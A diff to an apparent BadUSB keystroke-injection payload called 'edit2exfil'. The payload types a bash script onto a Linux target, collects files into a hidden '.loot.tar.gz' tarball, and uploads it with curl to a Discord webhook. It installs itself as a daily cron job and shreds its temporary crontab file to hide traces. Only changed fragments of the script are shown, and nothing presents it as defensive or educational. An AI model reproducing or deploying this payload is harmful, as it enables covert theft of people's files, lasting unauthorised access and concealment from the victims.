@@ -1,4 +1,3 @@
-==========================================================================================
 
 REM TITLE: edit2exfil
 
@@ -10,7 +9,7 @@ REM DESCRIPTION: (See below)
 
 REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10 | Timing of when and how frequent the script will be ran (10:00 AM, daily by default) via `cronjob` can be changed in line 53.
 
-==========================================================================================
+-----
 
 ## edit2exfil
 
@@ -59,10 +58,10 @@ if net_check; then
     if file_check; then
         tarball
     else
-        :
+        exit 0
     fi
 else
-    :
+    exit 0
 fi
 
 # Exfiltrate tarball of found files to Discord:
@@ -108,10 +107,10 @@ if net_check; then
     if file_check; then
         tarball
     else
-        :
+        exit 0
     fi
 else
-    :
+    exit 0
 fi
 curl -X POST -H "Content-Type: multipart/form-data" \
 -F "file=@/home/$user/.loot.tar.gz" \
@@ -122,5 +121,5 @@ END_STRINGLN
 CTRL c
 
 REM Granting execution permissions and adding ".e2e.sh" to cronjob to be executed at 10:00 AM, daily:
-STRINGLN chmod +x .e2e.sh && (crontab -l; echo "0 10 * * * ~/.e2e.sh") | crontab - && exit
+STRINGLN chmod +x .e2e.sh && crontab -l > e2etemp && echo "0 10 * * * ~/.e2e.sh" >> e2etemp && crontab e2etemp && shred -fuz e2etemp && exit
 ```
